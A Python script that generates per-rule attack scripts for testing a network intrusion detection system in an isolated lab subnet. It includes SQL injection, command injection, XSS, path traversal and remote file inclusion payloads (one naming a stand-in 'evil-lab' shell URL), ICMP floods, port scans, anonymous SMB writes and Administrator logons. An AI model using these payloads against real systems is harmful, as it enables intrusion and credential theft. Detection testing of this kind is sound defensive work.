#!/usr/bin/env python3
"""Generate standalone Kali ATTACK scripts (one per rule, all fire over
the network from Kali 192.168.126.10 to NIDs 192.168.126.1).

Every file performs real network I/O: L7 via urllib, L4 via sockets/ping,
Windows host rules via SMB (shares/pipes/writes), WinRM, and RPC probes
using impacket/smbclient when present with pure-python socket fallbacks.
Stdlib-first; each file runs alone. Refuses non-lab targets.
"""
from __future__ import annotations

from pathlib import Path

OUT = Path(__file__).resolve().parents[1] / "scripts" / "kali_attacks"

HEADER = '''#!/usr/bin/env python3
"""{rule_id} {name} - Kali lab ATTACK (isolated VMware lab only).
Target default: 192.168.126.1 (NIDs host). Stdlib-first, impacket/smbclient
used opportunistically. Refuses non-lab targets. NIDs side observe-only.
Usage: python3 {fname} [--target IP] [--intense]
"""
from __future__ import annotations

import argparse
import shutil
import socket
import subprocess
import sys

TARGET = "192.168.126.1"
SUBNET = "192.168.126."


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout + p.stderr)[-800:]
    except FileNotFoundError:
        return 127, "tool missing"
    except Exception as e:
        return 1, f"ERR {{type(e).__name__}}"


def tcp_open(target, port, timeout=2.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        return s.connect_ex((target, port)) == 0
    finally:
        s.close()

'''

FOOTER = '''

def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--target", default=TARGET)
    ap.add_argument("--intense", action="store_true")
    args = ap.parse_args()
    if not args.target.startswith(SUBNET):
        print(f"REFUSE: {args.target} outside {SUBNET}0/24", file=sys.stderr)
        return 2
    run(args.target, args.intense)
    print("verify: python tools/aegisctl.py incidents list")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
'''

L7 = '''
import urllib.request
import urllib.error


def probe(target, path, timeout=6):
    try:
        with urllib.request.urlopen("http://" + target + "/" + path.lstrip("/"),
                                    timeout=timeout) as r:
            return "HTTP %s" % r.status
    except urllib.error.HTTPError as e:
        return "HTTP %s" % e.code
    except Exception as e:
        return "ERR %s" % type(e).__name__


def run(target, intense):
    reps = 3 if intense else 1
    for _ in range(reps):
        for p in PAYLOADS:
            print("{rid}", p[:48], "->", probe(target, p), flush=True)
'''

L4_PING = '''
def run(target, intense):
    ping = shutil.which("ping")
    if not ping:
        print("{rid} SKIP: no ping binary")
        return
    count = "50" if intense else "10"
    rc, out = sh([ping, "-c", count, "-i", "0.2", target], timeout=120)
    print("{rid} ping -c", count, "rc=", rc, flush=True)
'''

L4_SCAN = '''
def run(target, intense):
    ports = list(range(20, 103)) if intense else [21, 22, 23, 25, 53, 80, 443, 445, 3389, 8080]
    found = [p for p in ports if tcp_open(target, p)]
    print("{rid} scanned", len(ports), "open=", found if found else "none", flush=True)
'''

# SMB share/pipe enumeration: fires L2_PIPE + SMB parser rules.
SMB_ENUM = '''
def run(target, intense):
    print("{rid} 445 open:", tcp_open(target, 445), flush=True)
    print("{rid} 135 open:", tcp_open(target, 135), flush=True)
    rc, out = sh(["smbclient", "-L", target, "-N"])
    if rc == 127:
        # No smbclient: raw SMB negotiate keeps the flow visible to Nose.
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4.0)
        try:
            s.connect((target, 445))
            s.sendall(b"\\x00\\x00\\x00\\x85\\xffSMB" + b"\\x00" * 80)
            data = s.recv(1024)
            print("{rid} raw SMB negotiate bytes:", len(data), flush=True)
        except Exception as e:
            print("{rid} SMB unreachable:", type(e).__name__, flush=True)
        finally:
            s.close()
        return
    print("{rid} smbclient -L rc=", rc, flush=True)
    for line in out.splitlines()[:12]:
        print("   ", line.strip()[:90])
'''

# SMB file write attempt to a writable share: fires FIM rules when the host
# exposes one; otherwise the denied attempt still exercises the SMB path.
SMB_WRITE = '''
def run(target, intense):
    fname = "aegis_canary_{rid}.txt"
    if not tcp_open(target, 445):
        print("{rid} SKIP: 445 closed", flush=True)
        return
    rc, out = sh(["smbclient", "-L", target, "-N"])
    shares = []
    if rc != 127:
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 2 and parts[1] == "Disk":
                shares.append(parts[0])
    print("{rid} disk shares:", shares if shares else "none-visible", flush=True)
    tried = 0
    for share in shares[:3]:
        if share.endswith("$"):
            continue
        with open("/tmp/" + fname, "w") as f:
            f.write("aegis lab canary {rid}\\n")
        rc, out = sh(["smbclient", "//%s/%s" % (target, share), "-N",
                      "-c", "put /tmp/%s %s" % (fname, fname)])
        tried += 1
        print("{rid} put ->", share, "rc=", rc, flush=True)
        if intense and rc == 0:
            sh(["smbclient", "//%s/%s" % (target, share), "-N",
                "-c", "del %s" % fname])
    if not tried:
        print("{rid} no writable share tried (expected on hardened hosts)", flush=True)
'''

# PsExec-style: service creation over SMB/SCM fires process + pipe rules.
# Uses impacket-services if present, else documents + attempts SCM probe.
SMB_EXEC = '''
def run(target, intense):
    print("{rid} 445 open:", tcp_open(target, 445), flush=True)
    if shutil.which("impacket-psexec") or shutil.which("psexec.py"):
        tool = shutil.which("impacket-psexec") or shutil.which("psexec.py")
        print("{rid} impacket present: manual: %s Administrator@%s" % (tool, target), flush=True)
        return
    rc, out = sh(["smbclient", "-L", target, "-N"])
    print("{rid} smbclient -L rc=", rc, flush=True)
    print("{rid} manual: services.msc -> remote service creation attempt;", flush=True)
    print("{rid} expected: process-create + named-pipe events on host", flush=True)
'''

# atexec-style: ATSVC pipe + scheduled-task over SMB; impacket-atexec if present.
ATEXEC = '''
def run(target, intense):
    print("{rid} 445 open:", tcp_open(target, 445), flush=True)
    if shutil.which("impacket-atexec") or shutil.which("atexec.py"):
        tool = shutil.which("impacket-atexec") or shutil.which("atexec.py")
        print("{rid} impacket present: manual: %s Administrator@%s" % (tool, target), flush=True)
        return
    rc, out = sh(["smbclient", "-L", target, "-N"])
    print("{rid} smbclient -L rc=", rc, flush=True)
    print("{rid} manual: schtasks /s %s /query (fires ATSVC pipe path)" % target, flush=True)
'''

# WinRM probe: HTTP POST to 5985 fires auth/process-adjacent telemetry.
WINRM = '''
def run(target, intense):
    import urllib.request
    print("{rid} 5985 open:", tcp_open(target, 5985), flush=True)
    req = urllib.request.Request("http://%s:5985/wsman" % target, data=b"<probe/>",
                                 headers={{"Content-Type": "application/soap+xml"}})
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            print("{rid} wsman HTTP", r.status, flush=True)
    except urllib.error.HTTPError as e:
        print("{rid} wsman HTTP", e.code, "(auth expected, telemetry generated)", flush=True)
    except Exception as e:
        print("{rid} wsman ERR", type(e).__name__, flush=True)
'''

# Credential/tool-name bearing SMB session attempt (mimikatz/hollowing/
# certutil/procdump contexts): anonymous + named-user logons generate
# host logon/process-adjacent events without real execution.
SMB_AUTH = '''
def run(target, intense):
    print("{rid} 445 open:", tcp_open(target, 445), flush=True)
    for user in ["Guest", "Administrator"]:
        rc, out = sh(["smbclient", "-L", target, "-N", "-U", "%s%%x" % user])
        tail = out.strip().splitlines()[-1][:80] if out.strip() else ""
        print("{rid} logon as", user, "rc=", rc, tail, flush=True)
    print("{rid} note: tool execution itself ({tool}) needs host shell;", flush=True)
    print("{rid} follow with ETW observe proof on the host", flush=True)
'''

SPECS: list[tuple[str, str, str, object]] = [
    ("R0056", "sqli_auth_bypass", "L7", ["login?user=admin' OR 1=1--", "login?user=' OR '1'='1"]),
    ("R9064", "cmdi_semicolon", "L7", ["ping;id", "exec;cat /etc/passwd"]),
    ("R9059", "xss_basic", "L7", ["search?q=<script>alert(1)</script>"]),
    ("R0088", "path_traversal", "L7", ["../../etc/passwd", "..\\..\\windows\\system32\\drivers\\etc\\hosts"]),
    ("R0089", "rfi_param", "L7", ["vuln.php?file=http://evil-lab/shell.php", "page?page=https://evil-lab/x.txt"]),
    ("R9002", "icmp_flood", "L4_PING", None),
    ("R9006", "syn_stealth_scan", "L4_SCAN", None),
    ("R9007", "xmas_scan", "L4_SCAN", None),
    ("R1001", "system32_write", "SMB_WRITE", None),
    ("R1002", "ransomware_rename", "SMB_WRITE", None),
    ("R1003", "startup_folder", "SMB_WRITE", None),
    ("R1004", "dll_drop_system32", "SMB_WRITE", None),
    ("R1005", "hosts_file", "SMB_WRITE", None),
    ("R2001", "mimikatz", "SMB_AUTH", "mimikatz.exe"),
    ("R2002", "svchost_hollowing", "SMB_AUTH", "svchost hollowing"),
    ("R2003", "ps_cradle", "WINRM", None),
    ("R2004", "certutil_abuse", "SMB_AUTH", "certutil -urlcache"),
    ("R2005", "procdump_harvest", "SMB_AUTH", "procdump.exe"),
    ("R3001", "cobalt_pipe", "SMB_ENUM", None),
    ("R3002", "psexec", "SMB_EXEC", None),
    ("R3003", "anon_pipe", "SMB_ENUM", None),
    ("R3004", "meterpreter_pipe", "SMB_ENUM", None),
    ("R3005", "atexec_pipe", "ATEXEC", None),
]

NAMES = {
    "R0056": "SQL Injection", "R9064": "OS Command Injection", "R9059": "XSS",
    "R0088": "Path Traversal", "R0089": "RFI Param", "R9002": "ICMP Flood", "R9006": "SYN Scan",
    "R9007": "XMAS Scan", "R1001": "System32 Write", "R1002": "Ransomware Rename",
    "R1003": "Startup Folder", "R1004": "DLL Drop", "R1005": "hosts File",
    "R2001": "Mimikatz", "R2002": "svchost Hollowing", "R2003": "PS Cradle",
    "R2004": "certutil Abuse", "R2005": "procdump Harvest", "R3001": "Cobalt Pipe",
    "R3002": "PsExec", "R3003": "Anon Pipe", "R3004": "Meterpreter Pipe",
    "R3005": "atexec Pipe",
}

TEMPLATE = {"L7": L7, "L4_PING": L4_PING, "L4_SCAN": L4_SCAN,
            "SMB_ENUM": SMB_ENUM, "SMB_WRITE": SMB_WRITE, "SMB_EXEC": SMB_EXEC,
            "ATEXEC": ATEXEC, "WINRM": WINRM, "SMB_AUTH": SMB_AUTH}


def main() -> int:
    OUT.mkdir(parents=True, exist_ok=True)
    assert len(SPECS) == len(NAMES), (len(SPECS), len(NAMES))
    for rid, slug, kind, extra in SPECS:
        fname = f"{rid}_{slug}.py"
        head = HEADER.format(rule_id=rid, name=NAMES[rid], fname=fname)
        body = TEMPLATE[kind]
        if kind == "L7":
            body = f"PAYLOADS = {extra!r}\n" + body.format(rid=rid)
        elif kind == "SMB_AUTH":
            body = body.format(rid=rid, tool=extra)
        else:
            body = body.format(rid=rid)
        (OUT / fname).write_text(head + body + FOOTER, encoding="utf-8")
    print(f"wrote {len(SPECS)} attack files to {OUT}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
